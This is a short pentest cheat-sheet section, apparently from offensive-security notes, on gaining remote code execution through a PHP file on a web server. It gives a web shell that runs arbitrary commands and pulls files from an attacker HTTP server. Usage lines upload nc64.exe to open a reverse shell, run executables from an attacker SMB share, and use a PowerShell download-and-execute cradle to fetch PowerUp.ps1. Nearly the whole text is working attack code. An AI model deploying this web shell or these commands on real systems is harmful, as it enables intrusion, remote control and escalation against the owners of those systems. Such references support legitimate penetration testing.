## PHP Remote Code Execute & File Upload

If we can modify or upload a php file in the webserver we can upload files or execute code with the following code:

```php
<?php
if (isset($_REQUEST['fupload'])) {
  file_put_contents($_REQUEST['fupload'], file_get_contents("http://$PYTHONSRV:8000/" . $_REQUEST['fupload']));
};
if (isset($_REQUEST['fexec'])) {
  echo "<pre>" . shell_exec($_REQUEST['fexec']) . "<pre>";
};
?>
```

Then, use get requests execute code:

```bash
.php?fexec=ls
.php?fexec=dir
#Serve the following file in a python HTTP server:
.php?fupload=nc64.exe
#Upload file and execute it:
.php?fupload=nc64.exe&fexec=nc64.exe -e cmd $IPADDRESS
#Execute files through Impacket SMB Server (Windows only):
.php?fexec=\\$KALIIP\$SHARE\$FILE.exe
```

Or execute powershell scripts:

```bash
.php?fexec=echo IEX(New-Object Net.WebClient).DownloadString('http://PYTHONSRV/PowerUp.ps1') | powershell -noprofile -
#Last "-" is to pull from stdin
```
